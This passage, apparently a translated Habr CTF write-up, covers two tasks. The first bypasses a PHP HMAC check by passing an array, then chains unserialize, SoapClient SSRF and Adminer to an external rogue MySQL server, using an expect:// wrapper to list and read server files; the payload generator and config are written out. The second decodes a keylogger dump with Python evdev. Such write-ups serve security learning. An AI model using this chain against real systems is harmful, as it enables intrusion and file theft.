class="hljs-string">'1'</span></span>,<span class="hljs-string"><span class="hljs-string">'2'</span></span>,<span class="hljs-string"><span class="hljs-string">'3'</span></span>,<span class="hljs-string"><span class="hljs-string">'100500'</span></span>); $uniq_sig1 = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>, $nonce, <span class="hljs-string"><span class="hljs-string">"SUPASECRET"</span></span>); $crypto_arrow1 = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>,<span class="hljs-string"><span class="hljs-string">"ANYDATA"</span></span>,$uniq_sig1); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"Singature with supasecret: $crypto_arrow1\n"</span></span>; $uniq_sig2 = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>, $nonce, <span class="hljs-string"><span class="hljs-string">"ANOTHER_SUPA_SECRET"</span></span>); $crypto_arrow2 = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>,<span class="hljs-string"><span class="hljs-string">"ANYDATA"</span></span>,$uniq_sig2); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"Singature with anothersupasecret: $crypto_arrow2\n"</span></span>; $crypto_arrow3 = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>,<span class="hljs-string"><span class="hljs-string">"ANYDATA"</span></span>,<span class="hljs-string"><span class="hljs-string">""</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"Signature with empty string as KEY: $crypto_arrow3\n"</span></span>; <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre><br>  HMAC in all 3 versions will be the same.  That is, in the case of signing any array with any key, the result will be an empty string.  And since  the final signature is considered to be taking the previous signature as input, we get <i>hash_hmac ("ANYDATA", "")</i> .  So we can calculate it before sending the request. <br><br>  <b>Total:</b> to bypass the signature, you need to pass <i>nonce</i> as an array, and the transmitted data in <i>userdata must</i> first be signed with an empty string, and the signature must <i>be</i> passed in the cookie <i>hmac</i> . <br><br>  The next step is to figure out how to unwind deserialization in order to get something useful.  We know that the adminer has an SSRF vulnerability, which means that in combination with <b>rogue_mysql_server</b> we can get a local file reading.  But Adminer is available only to internal resources.  So the final vector should look like this: SSRF in index.php -&gt; SSRF in adminer.php -&gt; rogue_mysql_server-&gt; local reading of files (plus there were hints from the organizers about expect and that the server has only nginx + php. The last one is to understand that it is necessary to exploit through rogue_mysq_server, expect (apparently a very rare wrapper that its presence is not always checked. And the name of the file with the flag without RCE is not found). <br><br>  Spin the SSRF on index.php.  Pay attention to the following code: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata = unserialize($serialized); $ip = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata[<span class="hljs-number"><span class="hljs-number">0</span></span>]; $useragent = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata[<span class="hljs-number"><span class="hljs-number">1</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata)) <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> MetaInfo(); $current_time = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata-&gt;get_CT(); $script = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata-&gt;get_SC();</code> </pre><br>  There are several tricks here.  The first trick is that if an object is deserialized, the <i>__destruct () of</i> this object will be called (read the article on Rdot.org).  The second trick is that we do deserialization already being in the destructor.  What happens if we try to deserialize an object of the same Logger class?  Ie, when deserializing, the destructor of the same class will be called again!  Actually, I thought that an endless loop would happen and there would be a DOS.  But it turned out PHP handles this situation correctly.  And the third trick, if in the process of deserialization we <i>slip</i> an object into the private variable <i>serverdata</i> , then the serverdata-&gt; get_CT () method will be called further along the code.  Here comes to the aid of the magic method <i>__ call ()</i> , which will be called in case of a call to a nonexistent class method. <br><br>  The key words ‚Äúphp class __call ssrf‚Äù quickly googled from another CTF where you can find a suitable PHP class SoapClient and that <i>__call ()</i> triggers a soap request.  We create SoapClient so that it makes a request to adminer.php with the necessary parameters.  For some reason I installed the adminer myself, and began to study what is there.  You could not do this.  The final code for generating payloads came out of this: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Logger</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $userdata; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $serverdata; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> $ip; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__construct</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($iter)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SoapClient(<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( <span class="hljs-string"><span class="hljs-string">'location'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"http://172.17.0.$iter/adminer.php?server=188.226.212.13:3306&amp;username=mfocuz1&amp;password=1337pass&amp;status="</span></span>, <span class="hljs-string"><span class="hljs-string">'uri'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"http://172.17.0.$iter"</span></span>, <span class="hljs-string"><span class="hljs-string">'trace'</span></span> =&gt; <span class="hljs-number"><span class="hljs-number">1</span></span>, )); } } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i=<span class="hljs-number"><span class="hljs-number">0</span></span>;$i&lt;=<span class="hljs-number"><span class="hljs-number">255</span></span>;$i++) { $payload=serialize(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>(<span class="hljs-string"><span class="hljs-string">"127.0.0.1"</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Logger($i))); file_put_contents(<span class="hljs-string"><span class="hljs-string">"/tmp/payloads"</span></span>,base64_encode($payload).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>,FILE_APPEND); file_put_contents(<span class="hljs-string"><span class="hljs-string">"/tmp/signatures"</span></span>,hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>, $payload,<span class="hljs-string"><span class="hljs-string">""</span></span>).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>,FILE_APPEND); } <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre><br>  In Kratz, we create the same <i>Logger</i> class with the same data as the source in <i>index.php</i> .  But in the constructor, we assign the internal private variable serverdata, an object of the <i>SoapClient</i> class.  The <i>SoapClient</i> object already points to the internal adminer resource with parameters for connecting to our server with <i>rogue_mysql_server</i> .  The cycle for the <i>$ iter</i> variable is needed in order to find the local IP of the adminer server.  The request through localhost was blocked.  In general, he had IP = 172.17.0.3, but I tried one and then launched Intruder =) Pitchfork mode, the first parameter is the file with signatures, the 2nd one with payloads. <br><br><img src="https://habrastorage.org/webt/ru/bv/rx/rubvrxo1p2veqptrzjjygtfqehy.png"><br><br>  To receive a connection on our server somewhere on the Internet, we start mysq_rogue_server, I took it <a href="https://github.com/allyshka/Rogue-MySql-Server">from here</a> .  Run with this configuration: <br><br><pre> <code class="python hljs">filelist = ( <span class="hljs-comment"><span class="hljs-comment">#'/flag_s0m3_r4nd0m_f1l3n4m3.txt', //    ,       'expect://ls &gt; /tmp/mfocuz_tmp01', '/tmp/mfocuz_tmp01', )</span></span></code> </pre><br>  We cannot give the <i>rogue</i> server the output from expect, so we redirect the output to a file, and read this file with the second command. <br><br>  We launch Intruder, see which IP will work: <br><br><img src="https://habrastorage.org/webt/55/zx/pe/55zxpe1eq9lny7giygqliatfnnm.png"><br><br>  In the <i>rogue</i> server log, we find this: <br><br> <code>2018-05-01 14:01:28,499:INFO:Result: '\x02bin\nboot\ncode\ndev\netc\nflag_s0m3_r4nd0m_f1l3n4m3.txt\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n' <br></code> <br><br>  It remains to send another request, but in the Rogue server enter the path to the flag.  Final query from Repeater: <br><br><img src="https://habrastorage.org/webt/g6/1-/gu/g61-gumw5b616hrm8qtlo_2qoby.png"><br><br><h2>  event0 </h2><br>  This is probably the easiest task of all that was proposed at CTF.  The most difficult thing was to understand what kind of file.  Difficult - because almost all the links in Google pointed to the computer game event [0].  At the same time, I read what game it was and even decided to go.  In general, from all this noise about event [0], it was necessary to find information about Linux devices.  In particular, about the linux USB keyboard.  That is, the event0 file is the result of the keylogger.  And then everything was very easy to google and it was possible to find an almost ready solution for the task <a href="https://khanhicetea.com/post/read_input_from_usb_keyboard_in_linux/">here</a> .  And at the same time open the Python documentation library evdev.  I took the script from the link above and replaced the reading from the device with the reading from the file.  My final script looked like this: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import pdb import struct import sys import evdev from evdev import InputDevice, list_devices, ecodes, categorize, InputEvent CODE_MAP_CHAR = { 'KEY_MINUS': "-", 'KEY_SPACE': " ", 'KEY_U': "U", 'KEY_W': "W", 'KEY_BACKSLASH': "\\", 'KEY_GRAVE': "`", 'KEY_NUMERIC_STAR': "*", 'KEY_NUMERIC_3': "3", 'KEY_NUMERIC_2': "2", 'KEY_NUMERIC_5': "5", 'KEY_NUMERIC_4': "4", 'KEY_NUMERIC_7': "7", 'KEY_NUMERIC_6': "6", 'KEY_NUMERIC_9': "9", 'KEY_NUMERIC_8': "8", 'KEY_NUMERIC_1': "1", 'KEY_NUMERIC_0': "0", 'KEY_E': "E", 'KEY_D': "D", 'KEY_G': "G", 'KEY_F': "F", 'KEY_A': "A", 'KEY_C': "C", 'KEY_B': "B", 'KEY_M': "M", 'KEY_L': "L", 'KEY_O': "O", 'KEY_N': "N", 'KEY_I': "I", 'KEY_H': "H", 'KEY_K': "K", 'KEY_J': "J", 'KEY_Q': "Q", 'KEY_P': "P", 'KEY_S': "S", 'KEY_X': "X", 'KEY_Z': "Z", 'KEY_KP4': "4", 'KEY_KP5': "5", 'KEY_KP6': "6", 'KEY_KP7': "7", 'KEY_KP0': "0", 'KEY_KP1': "1", 'KEY_KP2': "2", 'KEY_KP3': "3", 'KEY_KP8': "8", 'KEY_KP9': "9", 'KEY_5': "5", 'KEY_4': "4", 'KEY_7': "7", 'KEY_6': "6", 'KEY_1': "1", 'KEY_0': "0", 'KEY_3': "3", 'KEY_2': "2", 'KEY_9': "9", 'KEY_8': "8", 'KEY_LEFTBRACE': "[", 'KEY_RIGHTBRACE': "]", 'KEY_COMMA': ",", 'KEY_EQUAL': "=", 'KEY_SEMICOLON': ";", 'KEY_APOSTROPHE': "'", 'KEY_T': "T", 'KEY_V': "V", 'KEY_R': "R", 'KEY_Y': "Y", 'KEY_TAB': "\t", 'KEY_DOT': ".", 'KEY_SLASH': "/", } def parse_key_to_char(val): return CODE_MAP_CHAR[val] if val in CODE_MAP_CHAR else "" if __name__ == "__main__": # pdb.set_trace() f=open('/home/w4x/ctf/phd2018/event0',"rb") events=[] e=f.read(24) events.append(e) while e != "": e=f.read(24) events.append(e) for e in events: eBytes = a=struct.unpack("HHHHHHHHHHi",e) event = InputEvent(eBytes[6],eBytes[7],eBytes[8],eBytes[9],eBytes[10]) if event.type == ecodes.EV_KEY: print evdev.categorize(event)</span></span></code> </pre><br></div></div><br>  The first lines of the script output: <br><br> <code>key event at 0.000000, 28 (KEY_ENTER), up <br> key event at 0.000000, 47 (KEY_V), down <br> key event at 0.000000, 47 (KEY_V), up <br> key event at 0.000000, 23 (KEY_I), down <br> key event at 0.000000, 23 (KEY_I), up <br> key event at 0.000000, 50 (KEY_M), down <br> key event at 0.000000, 50 (KEY_M), up <br> key event at 0.000000, 57 (KEY_SPACE), down <br> key event at 0.000000, 57 (KEY_SPACE), up <br> key event at 0.000000, 37 (KEY_K), down <br> key event at 0.000000, 37 (KEY_K), up <br> key event at 0.000000, 18 (KEY_E), down <br> key event at 0.000000, 18 (KEY_E), up <br> key event at 0.000000, 21 (KEY_Y), down <br> key event at 0.000000, 21 (KEY_Y), up <br> key event at 0.000000, 52 (KEY_DOT), down <br> key event at 0.000000, 52 (KEY_DOT), up <br> key event at 0.000000, 20 (KEY_T), down <br> key event at 0.000000, 20 (KEY_T), up <br> key event at 0.000000, 45 (KEY_X), down <br> key event at 0.000000, 45 (KEY_X), up <br> key event at 0.000000, 20 (KEY_T), down <br> key event at 0.000000, 20 (KEY_T), up <br></code> <br>  down-up is the down-up keystroke.  Immediately we see that the <i>vim key.txt</i> command is <i>launched</i> .  Vim is a popular text editor that has two modes of operation, text editing and command mode.  Therefore, not all the letters in the log were real text.  To solve it, all you had to do was simply to click the same keys and get a flag on the output. </div><p>Source: <a href="https://habr.com/ru/post/354654/">https://habr.com/ru/post/354654/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../354642/index.html">Conclusion of the Telegram channel on your website</a></li>
<li><a href="../354646/index.html">On the topic of the day: a cross-platform client for Telegram on .NET Core and Avalonia</a></li>
<li><a href="../354648/index.html">Software creation of a type library</a></li>
<li><a href="../354650/index.html">Snake layout and "quantum" particles in Android applications (Part 2)</a></li>
<li><a href="../354652/index.html">Developing mobile games is no longer a Padawan, not yet a master</a></li>
<li><a href="../354662/index.html">Management of machine learning projects with high cost of error. Lecture in Yandex</a></li>
<li><a href="../354664/index.html">The digest of interesting materials for the mobile developer # 251 (April 23 - April 29)</a></li>
<li><a href="../354670/index.html">Stm32f103 programming from the very beginning</a></li>
<li><a href="../354672/index.html">The digest of fresh materials from the world of the frontend for the last week ‚Ññ312 (April 23 - 29, 2018)</a></li>
<li><a href="../354674/index.html">Virtual server with DDoS protection on VPS.house</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>